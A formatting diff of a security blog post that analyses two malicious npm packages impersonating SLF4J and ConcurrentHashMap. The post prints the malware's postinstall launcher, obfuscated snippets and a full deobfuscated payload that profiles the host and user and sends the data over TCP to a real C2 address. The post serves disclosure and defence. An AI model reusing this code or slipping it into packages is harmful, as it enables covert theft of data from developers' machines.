@@ -14,7 +14,7 @@ import { YouTube } from 'astro-embed';
 
 Today we found [slf4j-api-js](https://platform.safedep.io/community/malysis/01JSC5TDRSDZABBMXTDCBNSJQ3) and [concurrent-hashmap](https://platform.safedep.io/community/malysis/01JSC5WEA1TBP6186ATWXS5SVA) malicious npm packages impersonating the popular Java logging framework [SLF4J](https://www.slf4j.org/) and [ConcurrentHashMap](https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ConcurrentHashMap.html) respectively. While the payload appears to be unsophisticated, it is still an improvement over what we have seen in the past. Particularly, the payload does the following:
 
-- Spawns a child process from [npm post-install script](https://www.npmjs.com/package/postinstall) 
+- Spawns a child process from [npm post-install script](https://www.npmjs.com/package/postinstall)
 - Stays resident after installation
 - Collects system information and sends it to the C2 server
 
@@ -31,7 +31,7 @@ We decided to analyze `slf4j-api-js@1.0.0` closely to identify the malicious beh
   "scripts": {
     "postinstall": "node src/postinstall.js"
   },
- "keywords":["logging","slf4j","runtime","log-level","javascript"],
+  "keywords": ["logging", "slf4j", "runtime", "log-level", "javascript"],
   "license": "MIT"
 }
 ```
@@ -42,13 +42,13 @@ Next we looked at `src/postinstall.js` to understand the behavior of the code ex
 - Executes `main.js` from the same directory as the actual payload
 
 ```js
-const { spawn } = require("child_process");
-const path = require("path"); 
+const { spawn } = require('child_process');
+const path = require('path');
 // ...
-const mainFilePath = path.resolve(__dirname, "创建文件夹：slf4j-api-js/src/main.js");
-const child = spawn("node", [mainFilePath], {
-  detached: true, 
-  stdio: "ignore",  
+const mainFilePath = path.resolve(__dirname, '创建文件夹：slf4j-api-js/src/main.js');
+const child = spawn('node', [mainFilePath], {
+  detached: true,
+  stdio: 'ignore',
 });
 
 child.unref();
@@ -61,7 +61,7 @@ Interestingly the non-english characters results in invalid path when the packag
 
 Next we looked at `src/main.js` which used basic string obfuscation possibly with the goal of evading signature based detection systems.
 This indeed bypassed our [YARA Forge](https://yarahq.github.io/) based rule matching system but was picked by our static code analysis
-engine that looks for *code capabilities* such as network communication, file system access etc.
+engine that looks for _code capabilities_ such as network communication, file system access etc.
 
 ```js
 const _teg7m59w=require('os'),_n9acweg2=require('net')
@@ -71,30 +71,36 @@ const _xqanthql='8.152.163.60',_4apogc7a=8058;
 function _ahr17bwh(){try{let a='';a=_teg7m59w.platform()==='win32'?'tasklist /nh /fo csv':'ps aux';}}
 ```
 
-While the code was obfuscated, the lack of obfuscation of *command strings* easily gave away the intended payloads. For example, the following code determines the screen resolution based on the operating system.
+While the code was obfuscated, the lack of obfuscation of _command strings_ easily gave away the intended payloads. For example, the following code determines the screen resolution based on the operating system.
 
 ```js
 function _wpggtu79() {
-    try {
-        if (_teg7m59w.platform() === 'win32') {
-            const a = _grjt11kr('wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /format:value').toString(),
-                b = a.split('\n'),
-                c = {};
-            return b.forEach(d => {
-                d.includes('CurrentHorizontalResolution') ? c.width = parseInt(d.split('=')[1].trim(), 10) : d.includes('CurrentVerticalResolution') 
-                && (c.height = parseInt(d.split('=')[1].trim(), 10))
-            }), c.width && c.height ? c.width + 'x' + c.height : 'N/A'
-        } else if (_teg7m59w.platform() === 'linux') {
-            const a = _grjt11kr('xrandr --current | grep \\* | uniq | awk \'{print $1}\'').toString();
-            return a.trim() || 'N/A (Linux/No X)'
-        } else if (_teg7m59w.platform() === 'darwin') {
-            const a = _grjt11kr('system_profiler SPDisplaysDataType | grep Resolution | awk \'{print $2"x"$4}\'').toString();
-            return a.trim() || 'N/A (macOS)'
-        }
-        return 'N/A (不支持的操作系统或无头环境)'
-    } catch (a) {
-        return 'N/A (错误)'
+  try {
+    if (_teg7m59w.platform() === 'win32') {
+      const a = _grjt11kr(
+          'wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /format:value'
+        ).toString(),
+        b = a.split('\n'),
+        c = {};
+      return (
+        b.forEach((d) => {
+          d.includes('CurrentHorizontalResolution')
+            ? (c.width = parseInt(d.split('=')[1].trim(), 10))
+            : d.includes('CurrentVerticalResolution') && (c.height = parseInt(d.split('=')[1].trim(), 10));
+        }),
+        c.width && c.height ? c.width + 'x' + c.height : 'N/A'
+      );
+    } else if (_teg7m59w.platform() === 'linux') {
+      const a = _grjt11kr("xrandr --current | grep \\* | uniq | awk '{print $1}'").toString();
+      return a.trim() || 'N/A (Linux/No X)';
+    } else if (_teg7m59w.platform() === 'darwin') {
+      const a = _grjt11kr('system_profiler SPDisplaysDataType | grep Resolution | awk \'{print $2"x"$4}\'').toString();
+      return a.trim() || 'N/A (macOS)';
     }
+    return 'N/A (不支持的操作系统或无头环境)';
+  } catch (a) {
+    return 'N/A (错误)';
+  }
 }
 ```
 
@@ -143,42 +149,45 @@ const C2_SERVER_PORT = 8058;
  * @returns {string} Screen resolution in format "widthxheight" or "N/A" if detection fails
  */
 function getScreenResolution() {
-    try {
-        // For Windows systems
-        if (os.platform() === 'win32') {
-            const cmdOutput = execSync('wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /format:value').toString();
-            const outputLines = cmdOutput.split('\n');
-            const resolution = {};
-            
-            // Parse the command output to extract width and height
-            outputLines.forEach(line => {
-                if (line.includes('CurrentHorizontalResolution')) {
-                    resolution.width = parseInt(line.split('=')[1].trim(), 10);
-                } else if (line.includes('CurrentVerticalResolution')) {
-                    resolution.height = parseInt(line.split('=')[1].trim(), 10);
-                }
-            });
-            
-            // Return resolution in standard format if detected
-            return (resolution.width && resolution.height) ? 
-                resolution.width + 'x' + resolution.height : 'N/A';
-        } 
-        // For Linux systems
-        else if (os.platform() === 'linux') {
-            const cmdOutput = execSync('xrandr --current | grep \\* | uniq | awk \'{print $1}\'').toString();
-            return cmdOutput.trim() || 'N/A (Linux/No X)';
-        } 
-        // For macOS systems
-        else if (os.platform() === 'darwin') {
-            const cmdOutput = execSync('system_profiler SPDisplaysDataType | grep Resolution | awk \'{print $2"x"$4}\'').toString();
-            return cmdOutput.trim() || 'N/A (macOS)';
+  try {
+    // For Windows systems
+    if (os.platform() === 'win32') {
+      const cmdOutput = execSync(
+        'wmic path Win32_VideoController get CurrentHorizontalResolution,CurrentVerticalResolution /format:value'
+      ).toString();
+      const outputLines = cmdOutput.split('\n');
+      const resolution = {};
+
+      // Parse the command output to extract width and height
+      outputLines.forEach((line) => {
+        if (line.includes('CurrentHorizontalResolution')) {
+          resolution.width = parseInt(line.split('=')[1].trim(), 10);
+        } else if (line.includes('CurrentVerticalResolution')) {
+          resolution.height = parseInt(line.split('=')[1].trim(), 10);
         }
-        
-        // For unsupported operating systems
-        return 'N/A (Unsupported operating system or headless environment)';
-    } catch (error) {
-        return 'N/A (Error)';
+      });
+
+      // Return resolution in standard format if detected
+      return resolution.width && resolution.height ? resolution.width + 'x' + resolution.height : 'N/A';
     }
+    // For Linux systems
+    else if (os.platform() === 'linux') {
+      const cmdOutput = execSync("xrandr --current | grep \\* | uniq | awk '{print $1}'").toString();
+      return cmdOutput.trim() || 'N/A (Linux/No X)';
+    }
+    // For macOS systems
+    else if (os.platform() === 'darwin') {
+      const cmdOutput = execSync(
+        'system_profiler SPDisplaysDataType | grep Resolution | awk \'{print $2"x"$4}\''
+      ).toString();
+      return cmdOutput.trim() || 'N/A (macOS)';
+    }
+
+    // For unsupported operating systems
+    return 'N/A (Unsupported operating system or headless environment)';
+  } catch (error) {
+    return 'N/A (Error)';
+  }
 }
 
 /**
@@ -187,16 +196,13 @@ function getScreenResolution() {
  * @returns {string} The detected locale or "N/A" if detection fails
  */
 function getSystemLocale() {
-    try {
-        // Try to get locale from Intl API (similar to browser behavior)
-        return Intl.DateTimeFormat().resolvedOptions().locale;
-    } catch (error) {
-        // Fallback to environment variables if Intl API fails
-        return process.env.LANG || 
-               process.env.LC_ALL || 
-               process.env.LC_MESSAGES || 
-               'N/A';
-    }
+  try {
+    // Try to get locale from Intl API (similar to browser behavior)
+    return Intl.DateTimeFormat().resolvedOptions().locale;
+  } catch (error) {
+    // Fallback to environment variables if Intl API fails
+    return process.env.LANG || process.env.LC_ALL || process.env.LC_MESSAGES || 'N/A';
+  }
 }
 
 /**
@@ -205,32 +211,31 @@ function getSystemLocale() {
  * @returns {object} Process information including count and detection flags
  */
 function scanRunningProcesses() {
-    try {
-        // Choose the appropriate command based on OS
-        let command = '';
-        command = os.platform() === 'win32' ? 
-                  'tasklist /nh /fo csv' : 'ps aux';
-        
-        // Execute the command to list processes
-        const cmdOutput = execSync(command, {
-            timeout: 5000,
-            encoding: 'utf8'
-        });
-        
-        const processLines = cmdOutput.trim().split('\n');
-        
-        // Return process data with flags for specific application types
-        return {
-            count: processLines.length,
-            hasBrowser: /chrome|firefox|msedge|safari/i.test(cmdOutput),
-            hasOffice: /winword|excel|powerpnt|soffice/i.test(cmdOutput)
-        };
-    } catch (error) {
-        return {
-            count: -1,
-            error: error.message
-        };
-    }
+  try {
+    // Choose the appropriate command based on OS
+    let command = '';
+    command = os.platform() === 'win32' ? 'tasklist /nh /fo csv' : 'ps aux';
+
+    // Execute the command to list processes
+    const cmdOutput = execSync(command, {
+      timeout: 5000,
+      encoding: 'utf8',
+    });
+
+    const processLines = cmdOutput.trim().split('\n');
+
+    // Return process data with flags for specific application types
+    return {
+      count: processLines.length,
+      hasBrowser: /chrome|firefox|msedge|safari/i.test(cmdOutput),
+      hasOffice: /winword|excel|powerpnt|soffice/i.test(cmdOutput),
+    };
+  } catch (error) {
+    return {
+      count: -1,
+      error: error.message,
+    };
+  }
 }
 
 /**
@@ -238,62 +243,62 @@ function scanRunningProcesses() {
  * Gathers hardware, OS, and user data to create a system profile
  */
 function collectSystemData() {
-    // Record start time for performance measurement
-    const startTime = Date.now();
-    
-    // Gather basic OS and hardware information
-    const osType = os.platform();
-    const osRelease = os.release();
-    const osVersion = os.version();
-    const architecture = os.arch();
-    const hostName = os.hostname();
-    const uptime = os.uptime();
-    const userInfo = os.userInfo();
-    const totalMemory = os.totalmem();
-    const freeMemory = os.freemem();
-    const cpuInfo = os.cpus();
-    
-    // Gather additional information using helper functions
-    const screenResolution = getScreenResolution();
-    const locale = getSystemLocale();
-    const processInfo = scanRunningProcesses();
-    const isTTY = process.stdout.isTTY;
-    
-    // Unique identifier/flag for this version of the malware
-    const malwareFlag = 'dv2-7';
-    
-    // Assemble all collected data into a structured format
-    const systemProfile = {
-        flag: malwareFlag,
-        basic: {
-            osType: osType,
-            arch: architecture
-        },
-        detailed: {
-            osRelease: osRelease,
-            osVersion: osVersion,
-            hostname: hostName,
-            uptime: uptime,
-            username: userInfo.username,
-            homedir: userInfo.homedir,
-            shell: userInfo.shell,
-            totalMemory: totalMemory,
-            freeMemory: freeMemory,
-            cpuCount: cpuInfo.length,
-            cpuModel: cpuInfo.length > 0 ? cpuInfo[0].model : 'N/A',
-            screenResolution: screenResolution,
-            locale: locale,
-            processes: processInfo,
-            isInteractive: isTTY
-        }
-    };
-    
-    // Calculate execution time and add to payload
-    const endTime = Date.now();
-    systemProfile.executionDurationMs = endTime - startTime;
-    
-    // Send the collected data to the C2 server
-    sendDataToC2Server(JSON.stringify(systemProfile));
+  // Record start time for performance measurement
+  const startTime = Date.now();
+
+  // Gather basic OS and hardware information
+  const osType = os.platform();
+  const osRelease = os.release();
+  const osVersion = os.version();
+  const architecture = os.arch();
+  const hostName = os.hostname();
+  const uptime = os.uptime();
+  const userInfo = os.userInfo();
+  const totalMemory = os.totalmem();
+  const freeMemory = os.freemem();
+  const cpuInfo = os.cpus();
+
+  // Gather additional information using helper functions
+  const screenResolution = getScreenResolution();
+  const locale = getSystemLocale();
+  const processInfo = scanRunningProcesses();
+  const isTTY = process.stdout.isTTY;
+
+  // Unique identifier/flag for this version of the malware
+  const malwareFlag = 'dv2-7';
+
+  // Assemble all collected data into a structured format
+  const systemProfile = {
+    flag: malwareFlag,
+    basic: {
+      osType: osType,
+      arch: architecture,
+    },
+    detailed: {
+      osRelease: osRelease,
+      osVersion: osVersion,
+      hostname: hostName,
+      uptime: uptime,
+      username: userInfo.username,
+      homedir: userInfo.homedir,
+      shell: userInfo.shell,
+      totalMemory: totalMemory,
+      freeMemory: freeMemory,
+      cpuCount: cpuInfo.length,
+      cpuModel: cpuInfo.length > 0 ? cpuInfo[0].model : 'N/A',
+      screenResolution: screenResolution,
+      locale: locale,
+      processes: processInfo,
+      isInteractive: isTTY,
+    },
+  };
+
+  // Calculate execution time and add to payload
+  const endTime = Date.now();
+  systemProfile.executionDurationMs = endTime - startTime;
+
+  // Send the collected data to the C2 server
+  sendDataToC2Server(JSON.stringify(systemProfile));
 }
 
 /**
@@ -302,29 +307,29 @@ function collectSystemData() {
  * @param {string} data - JSON string containing system information
  */
 function sendDataToC2Server(data) {
-    // Create a new TCP socket
-    const socket = new net.Socket();
-    
-    // Connect to the remote C2 server
-    socket.connect(C2_SERVER_PORT, C2_SERVER_IP, () => {
-        // Send the collected data once connected
-        socket.write(data);
-    });
-    
-    // Handle responses (destroys connection after receiving any data)
-    socket.on('data', (response) => {
-        socket.destroy();
-    });
-    
-    // Empty error handler (suppresses errors)
-    socket.on('error', (error) => {
-        // Intentionally empty to hide connection errors
-    });
-    
-    // Empty close handler
-    socket.on('close', () => {
-        // Intentionally empty
-    });
+  // Create a new TCP socket
+  const socket = new net.Socket();
+
+  // Connect to the remote C2 server
+  socket.connect(C2_SERVER_PORT, C2_SERVER_IP, () => {
+    // Send the collected data once connected
+    socket.write(data);
+  });
+
+  // Handle responses (destroys connection after receiving any data)
+  socket.on('data', (response) => {
+    socket.destroy();
+  });
+
+  // Empty error handler (suppresses errors)
+  socket.on('error', (error) => {
+    // Intentionally empty to hide connection errors
+  });
+
+  // Empty close handler
+  socket.on('close', () => {
+    // Intentionally empty
+  });
 }
 
 // Start the data collection and exfiltration process
